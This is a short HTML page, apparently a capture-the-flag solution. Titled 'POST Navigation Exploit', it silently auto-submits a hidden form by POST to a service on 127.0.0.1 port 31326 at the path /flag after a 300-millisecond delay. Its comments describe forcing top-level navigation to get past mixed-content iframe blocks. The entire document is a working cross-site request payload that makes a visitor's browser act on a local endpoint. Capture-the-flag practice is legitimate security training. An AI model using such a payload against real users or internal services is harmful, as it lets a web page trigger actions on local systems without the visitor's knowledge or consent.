<!DOCTYPE html>
<html>
<head>
    <title>POST Navigation Exploit</title>
</head>
<body>
    <h2>Submitting to Flag Endpoint...</h2>
    
    <!-- target="_self" forces the main window to navigate to the local HTTP endpoint, bypassing mixed content iframe blocks -->
    <form id="autoForm" action="http://127.0.0.1:31326/flag" method="POST">
        <!-- Include potential required parameters just in case -->
        <input type="hidden" name="submit" value="1">
    </form>

    <script>
        setTimeout(() => {
            document.getElementById('autoForm').submit();
        }, 300);
    </script>
</body>
</html>
